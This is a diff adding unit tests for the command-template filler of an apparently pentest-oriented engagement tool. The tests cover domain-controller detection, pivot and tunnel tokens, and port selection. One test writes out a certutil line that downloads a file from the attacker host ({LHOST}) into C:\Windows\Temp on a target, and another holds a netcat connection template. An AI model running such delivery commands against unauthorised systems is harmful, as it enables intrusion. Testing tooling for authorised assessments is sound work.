@@ -4,7 +4,8 @@ import type { Host } from '../../../types/host';
 import type { Service } from '../../../types/service';
 import type { Tunnel } from '../../../types/network';
 import type { CredAttempt, Credential } from '../../../types/credentials';
-import { defaultCredFor, defaultDomainCred, fillCommand, hasUnmodelledQuoting, quoteContextAt, tunnelFor, type FillInput } from '../../../engines/checklist';
+import type { ChecklistGoal } from '../../../engines/checklist';
+import { defaultCredFor, defaultDomainCred, fillCommand, portChoices, hasUnmodelledQuoting, quoteContextAt, tunnelFor, type FillInput } from '../../../engines/checklist';
 
 const host = (p: Partial<Host> = {}): Host => ({
   id: 'h1', engagementId: 'e1', name: 'ms01', ip: '172.16.1.5', os: 'windows', boardColumn: 'information-gathering', boardManual: false,
@@ -131,6 +132,46 @@ describe('fillCommand', () => {
     const r = fillCommand('{SUBNET} {SUBNET_PREFIX}', input({ host: host({ ip: '1.2.3.4' }), engagement: eng({ scopeCidrs: ['10.9.0.0/16'] }) }));
     expect(r.text).toBe('10.9.0.0/16 {SUBNET_PREFIX}');
     expect(r.unresolved).toEqual(['SUBNET_PREFIX']);
+  });
+
+  it('DC_IP fills from the DC-named host when its ports were never scanned (it sits behind a pivot)', () => {
+    const dc = host({ id: 'dc', name: 'DC01', ip: '172.16.5.10' });
+    const ms = host({ id: 'ms', name: 'MS01', ip: '172.16.5.11' });
+    const r = fillCommand('{DC_IP} {DC_HOST}', input({ host: ms, engagement: eng({ domain: 'corp.local' }), hosts: [ms, dc] }));
+    expect(r.text).toBe('172.16.5.10 DC01.corp.local');
+    expect(r.unresolved).toEqual([]);
+  });
+
+  it('a DC picked by name is marked; a scanned DC is not', () => {
+    const dc = host({ id: 'dc', name: 'DC01', ip: '172.16.5.10' });
+    expect(fillCommand('{DC_IP}', input({ hosts: [host(), dc] })).dcByName).toBe(true);
+    expect(fillCommand('{DC_IP}', input({ hosts: [dc], servicesByHost: adServices('dc') })).dcByName).toBeUndefined();
+    expect(fillCommand('{TARGET_IP}', input({ hosts: [host(), dc] })).dcByName).toBeUndefined();
+  });
+
+  it('dc-web or dc_files alone is not a DC name', () => {
+    for (const name of ['dc-web', 'dc_files', 'DC-WEB.corp.local']) {
+      const r = fillCommand('{DC_IP}', input({ hosts: [host(), host({ id: 'x', name, ip: '10.0.0.9' })] }));
+      expect(r.unresolved).toEqual(['DC_IP']);
+    }
+  });
+
+  it('DC_IP fills from the only Kerberos host when LDAP was not seen', () => {
+    const dc = host({ id: 'dc', name: 'core', ip: '10.0.0.10' });
+    const r = fillCommand('{DC_IP}', input({ hosts: [host(), dc], servicesByHost: new Map([['dc', [svc('dc', 88)]]]) }));
+    expect(r.text).toBe('10.0.0.10');
+  });
+
+  it('with two AD hosts the one named like a DC fills DC_IP', () => {
+    const a = host({ id: 'a', name: 'files01', ip: '10.0.0.4' });
+    const b = host({ id: 'b', name: 'dc02', ip: '10.0.0.5' });
+    const r = fillCommand('{DC_IP}', input({ hosts: [a, b], servicesByHost: new Map([...adServices('a'), ...adServices('b')]) }));
+    expect(r.text).toBe('10.0.0.5');
+  });
+
+  it('two unscanned DC-named hosts stay ambiguous', () => {
+    const r = fillCommand('{DC_IP}', input({ hosts: [host({ id: 'a', name: 'dc01', ip: '10.0.0.4' }), host({ id: 'b', name: 'dc02', ip: '10.0.0.5' })] }));
+    expect(r.unresolved).toEqual(['DC_IP']);
   });
 
   it('DC fields stay unresolved when two hosts are AD', () => {
@@ -302,5 +343,102 @@ describe('defaultDomainCred', () => {
     ];
     expect(defaultDomainCred(creds, attempts)?.id).toBe('c3');
     expect(defaultDomainCred(creds, [])).toBeNull();
+  });
+});
+
+describe('arsenal tokens', () => {
+  const text = (t: string, p: Partial<FillInput> = {}) => fillCommand(t, input(p));
+
+  it('TARGET_HOST is the FQDN for a domain-joined host and the name otherwise', () => {
+    const dc = host({ id: 'dc', name: 'dc01', ip: '172.16.1.2' });
+    const hosts = [dc, host({ name: 'ms01' })];
+    const servicesByHost = new Map([['dc', [svc('dc', 88), svc('dc', 389)]]]);
+    const joined = input({ engagement: eng({ domain: 'corp.local' }), hosts, servicesByHost });
+    expect(fillCommand('{TARGET_HOST}', joined).text).toBe('ms01.corp.local');
+    // no domain on the engagement: the bare name
+    expect(text('{TARGET_HOST}', { engagement: eng(), hosts, servicesByHost }).text).toBe('ms01');
+    // not domain-joined (Linux host, no AD hosts): the bare name
+    const lin = host({ os: 'linux', name: 'web01' });
+    expect(text('{TARGET_HOST} {HOSTNAME}', { host: lin, engagement: eng({ domain: 'corp.local' }) }).text).toBe('web01 web01');
+    expect(fillCommand('{HOSTNAME}', joined).text).toBe('ms01');
+  });
+
+  it('PIVOT_IP and PIVOT_NAME come from the tunnel via host', () => {
+    const pivot = host({ id: 'pivot', name: 'jump01', ip: '10.0.0.9' });
+    const r = text('{PIVOT_IP} {PIVOT_NAME}', { hosts: [pivot], tunnels: [tun()] });
+    expect(r.text).toBe('10.0.0.9 jump01');
+    expect(r.viaTunnel?.viaHostName).toBe('jump01');
+    const none = text('{PIVOT_IP} {PIVOT_NAME}', { hosts: [pivot] });
+    expect(none.unresolved.sort()).toEqual(['PIVOT_IP', 'PIVOT_NAME']);
+  });
+
+  it('KALI_USER, COMMUNITY and SOCKS_PORT fill from settings and defaults', () => {
+    const r = text('{KALI_USER} {COMMUNITY} {SOCKS_PORT}', { kaliUser: 'kali' });
+    expect(r.text).toBe('kali public 1080');
+    expect(r.unresolved).toEqual([]);
+    expect(text('{KALI_USER}').unresolved).toEqual(['KALI_USER']);
+  });
+
+  it('DEST_DIR follows the host OS', () => {
+    expect(text('{DEST_DIR}').text).toBe('C:\\Windows\\Temp');
+    expect(text('{DEST_DIR}', { host: host({ os: 'linux' }) }).text).toBe('/tmp');
+  });
+
+  it('DEST_DIR never guesses: without a host OS it follows the command OS, else stays unresolved', () => {
+    const dash = host({ id: '', name: '', ip: null, os: null as unknown as Host['os'] });
+    const certutil = 'certutil -urlcache -split -f http://{LHOST}/{FILE} {DEST_DIR}\\{FILE}';
+    expect(fillCommand(certutil, input({ host: dash, overrides: { FILE: 'a.exe' } }), { commandOs: 'windows' }).text).toContain('C:\\Windows\\Temp\\a.exe');
+    expect(fillCommand('wget x -O {DEST_DIR}/x', input({ host: dash }), { commandOs: 'linux' }).text).toBe('wget x -O /tmp/x');
+    expect(fillCommand('cp x {DEST_DIR}', input({ host: dash }), { commandOs: 'any' }).unresolved).toEqual(['DEST_DIR']);
+    expect(fillCommand('cp x {DEST_DIR}', input({ host: dash })).unresolved).toEqual(['DEST_DIR']);
+    expect(fillCommand('cp x {DEST_DIR}', input({ host: host({ os: 'other' }) }), { commandOs: 'any' }).unresolved).toEqual(['DEST_DIR']);
+    // The host's OS wins over the command's.
+    expect(fillCommand('{DEST_DIR}', input({ host: host({ os: 'linux' }) }), { commandOs: 'windows' }).text).toBe('/tmp');
+  });
+
+  it('PORT uses the first port hint and stays unresolved without one', () => {
+    expect(text('{PORT}', { portHint: [8080, 80] }).text).toBe('8080');
+    expect(text('{PORT}', { portHint: [] }).unresolved).toEqual(['PORT']);
+    expect(text('{PORT}').unresolved).toEqual(['PORT']);
+  });
+
+  it('overrides win over computed values', () => {
+    const r = text('{KALI_USER} {PORT} {DEST_DIR} {COMMUNITY} {FILE}', {
+      kaliUser: 'kali', portHint: [80],
+      overrides: { KALI_USER: 'op', PORT: '9000', DEST_DIR: 'D:\\x', COMMUNITY: 'private', FILE: 'a.exe' },
+    });
+    expect(r.text).toBe('op 9000 D:\\x private a.exe');
+    expect(r.unresolved).toEqual([]);
+  });
+
+  it('overrides win over the global-field tokens too (LHOST, LPORT, TARGET_IP, USER, DOMAIN)', () => {
+    const r = text('{LHOST} {LPORT} {TARGET_IP} {DOMAIN}', {
+      overrides: { LHOST: '10.9.9.9', LPORT: '9001', TARGET_IP: '10.1.1.1', DOMAIN: 'x.local' },
+    });
+    expect(r.text).toBe('10.9.9.9 9001 10.1.1.1 x.local');
+    expect(r.unresolved).toEqual([]);
+    expect(text('{LHOST} {TARGET_IP}').text).toBe('10.10.14.3 172.16.1.5');
+  });
+
+  it('portChoices offers only ports whose state is exactly open (never open|filtered, closed, filtered, or another host\'s)', () => {
+    const udp = { ...svc('h1', 7), protocol: 'udp' as const, state: 'open|filtered' };
+    const other = svc('h2', 9);
+    const inp = input({ servicesByHost: new Map([['h1', [udp, { ...svc('h1', 53), state: 'closed|filtered' }, { ...svc('h1', 25), state: 'filtered' }, { ...svc('h1', 80), state: ' Open ' }]], ['h2', [other]]]) });
+    expect(portChoices(inp)).toEqual([80]);
+    const none = input({ servicesByHost: new Map([['h1', [udp]]]) });
+    expect(portChoices(none)).toEqual([]);
+    expect(fillCommand('nc {TARGET_IP} {PORT}', none).unresolved).toEqual(['PORT']);
+  });
+
+  it('portChoices filters open ports by the goal\'s applies, ascending', () => {
+    const closed = { ...svc('h1', 25), state: 'closed' };
+    const web = { ...svc('h1', 8080), nmapService: 'http' };
+    const inp = input({ servicesByHost: new Map([['h1', [svc('h1', 445), web, svc('h1', 22), closed, { ...svc('h1', 80), nmapService: 'http' }]]]) });
+    expect(portChoices(inp)).toEqual([22, 80, 445, 8080]);
+    const goal = (applies: ChecklistGoal['applies']): ChecklistGoal => ({ id: 'g', stage: 's', title: 't', applies });
+    expect(portChoices(inp, goal({ ports: [445, 139] }))).toEqual([445]);
+    expect(portChoices(inp, goal({ services: ['http'] }))).toEqual([80, 8080]);
+    expect(portChoices(inp, goal({ ports: [22], services: ['http'] }))).toEqual([22, 80, 8080]);
+    expect(portChoices(inp, goal({ os: ['windows'] }))).toEqual([22, 80, 445, 8080]);
   });
 });
